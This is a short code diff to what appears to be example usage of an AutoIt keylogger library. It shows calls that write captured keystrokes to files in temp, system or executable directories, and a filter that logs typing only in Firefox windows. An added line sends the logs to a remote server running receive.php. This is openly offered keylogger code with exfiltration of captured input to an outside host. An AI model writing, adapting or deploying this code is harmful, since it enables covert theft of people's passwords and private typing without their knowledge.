@@ -6,7 +6,7 @@ _initWithFilename(@TempDir, "keylog-output")
 _run() ; After "_run()" is executed the programm is stuck in a loop
 
 ; Creates a File with a rather cryptic name in the useres System directory
-_init(@SystemDir)
+_init("") ; Using an empty-string as parameter means you create a file where your executable is stored
 _run()
 
 ; Logs only when the user types in a window with "Firefox" in the title
@@ -17,3 +17,6 @@ _logWindow("Firefox")
 While 1
   If <CONDITION> Then _read()
 WEnd
+
+; You can send your logs to a server. The server has to run receive.php
+_send("http://myserver.my/receive.php/")
